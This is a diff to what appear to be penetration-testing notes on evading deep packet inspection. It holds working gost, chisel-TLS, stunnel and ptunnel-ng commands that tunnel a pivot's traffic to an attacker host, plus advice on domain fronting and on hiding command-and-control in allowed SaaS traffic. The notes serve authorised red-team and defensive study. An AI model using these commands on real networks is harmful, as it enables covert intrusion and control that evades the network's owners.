@@ -333,9 +333,103 @@ nslookup domain.com SPECIFIC_DNS_SERVER
 
 ---
 
+## TLS / HTTPS Tunneling (Blending With Web Traffic)
+
+When DPI inspects but allows TLS to the internet, wrap your tunnel in real HTTPS so payloads aren't in cleartext and the flow looks like a browser.
+
+### gost (multi-protocol tunnel)
+
+```bash
+# Attacker: HTTPS-listening SOCKS relay
+gost -L "socks5+tls://:8443?cert=cert.pem&key=key.pem"
+# Pivot: forward local SOCKS through the TLS relay
+gost -L socks5://:1080 -F "socks5+tls://10.10.14.7:8443"
+proxychains -q nmap -sT -Pn 10.5.5.0/24
+```
+
+### Chisel over real HTTPS (vs WebSocket plaintext)
+
+```bash
+# Generate/obtain a cert; run chisel with TLS so DPI sees only an encrypted stream
+chisel server -p 443 --reverse --tls-key key.pem --tls-cert cert.pem
+./chisel client https://10.10.14.7:443 R:socks
+```
+
+### stunnel wrapper (TLS-wrap any TCP service)
+
+```ini
+# stunnel.conf (attacker, server mode)
+[tunnel]
+accept = 443
+connect = 127.0.0.1:1080      # e.g. a local SOCKS/dnscat/chisel endpoint
+cert = /etc/stunnel/cert.pem
+```
+
+---
+
+## Domain Fronting & CDN Pass-Through (Concept)
+
+DPI/egress filters often allow traffic to large CDNs/SaaS. Two patterns:
+
+- **Domain fronting:** the TLS SNI shows an allowed front domain on a shared CDN while the inner HTTP `Host:` header routes to your C2 origin. Increasingly broken as CDNs enforce SNI==Host, but **domain borrowing / fronting on permissive CDNs** still works in places.
+- **Legit-service C2 (the 2025 reality):** route C2 over services already allowed — Microsoft Graph/SharePoint, Slack, Telegram, GitHub, Discord, Cloudflare Workers. Traffic terminates at a trusted domain, so SNI/cert inspection passes. Most modern C2 frameworks ship "external C2"/redirector profiles for exactly this (see `12-command-and-control/`).
+
+Practical guidance: when DPI does TLS inspection (MITM), a private cert tunnel will be flagged/blocked — you must ride a **trusted, allow-listed destination**. When DPI only does SNI/heuristic filtering (no MITM), a clean HTTPS tunnel (gost/chisel-TLS/stunnel) to your own domain on 443 usually passes.
+
+---
+
+## ICMP Tunneling (Egress = ping only)
+
+Rare but real on locked-down networks that permit outbound ICMP echo.
+
+```bash
+# icmptunnel / ptunnel-ng — encapsulate TCP inside ICMP echo request/reply
+# Attacker (server):
+sudo ptunnel-ng -r10.10.14.7 -R22
+# Pivot (client) forwards local:2222 -> attacker:22 over ICMP:
+sudo ptunnel-ng -p10.10.14.7 -l2222 -r10.10.14.7 -R22
+ssh -p 2222 user@127.0.0.1
+```
+Very slow; large/structured ICMP payloads are an obvious NDR signature.
+
+---
+
+## Choosing a Channel vs the Filter
+
+| Egress allowed | Best channel | Tool |
+|----------------|--------------|------|
+| Full TCP out | Direct TUN pivot | Ligolo-ng (`../pivoting/`) |
+| HTTP only (proxy) | HTTP/WebSocket | Chisel |
+| HTTPS to anywhere | TLS-wrapped SOCKS | gost / chisel-TLS / stunnel |
+| HTTPS to allow-list only | Ride a trusted SaaS/CDN | C2 external profile, domain fronting |
+| DNS only | DNS tunnel | dnscat2 / iodine |
+| ICMP only | ICMP tunnel | ptunnel-ng |
+
+---
+
+## Cheatsheet
+
+```bash
+# Chisel (HTTP)              chisel server -p 8080 --reverse ; ./chisel client IP:8080 R:socks
+# Chisel (HTTPS)            chisel server -p 443 --reverse --tls-key k --tls-cert c
+# gost (TLS SOCKS)          gost -L socks5+tls://:8443?cert=c&key=k  /  gost -F socks5+tls://IP:8443
+# dnscat2                   dnscat2-server zone.tld --secret=K  ;  ./dnscat --secret=K zone.tld
+# iodine (IP-over-DNS)      iodined -f 10.0.0.1 t.zone.tld  ;  iodine -f t.zone.tld
+# ptunnel-ng (ICMP)         ptunnel-ng -r IP -R22  ;  ptunnel-ng -p IP -l2222 -r IP -R22
+# stunnel                   wrap any TCP in TLS on :443
+# Capture/verify            sudo tcpdump -nni <if> 'udp port 53 or icmp or tcp port 443'
+```
+
+---
+
 ## Resources
 
 - Chisel: https://github.com/jpillora/chisel
 - dnscat2: https://github.com/iagox86/dnscat2
 - iodine (IP-over-DNS): https://github.com/yarrick/iodine
 - dns2tcp (TCP-over-DNS): https://github.com/alex-sector/dns2tcp
+- gost (GO Simple Tunnel): https://github.com/ginuerzh/gost
+- ptunnel-ng (ICMP tunnel): https://github.com/utoni/ptunnel-ng
+- stunnel: https://www.stunnel.org/
+- Ligolo-ng (full TCP pivoting): https://github.com/nicocha30/ligolo-ng
+- MITRE ATT&CK — Protocol Tunneling (T1572), DNS (T1071.004): https://attack.mitre.org/
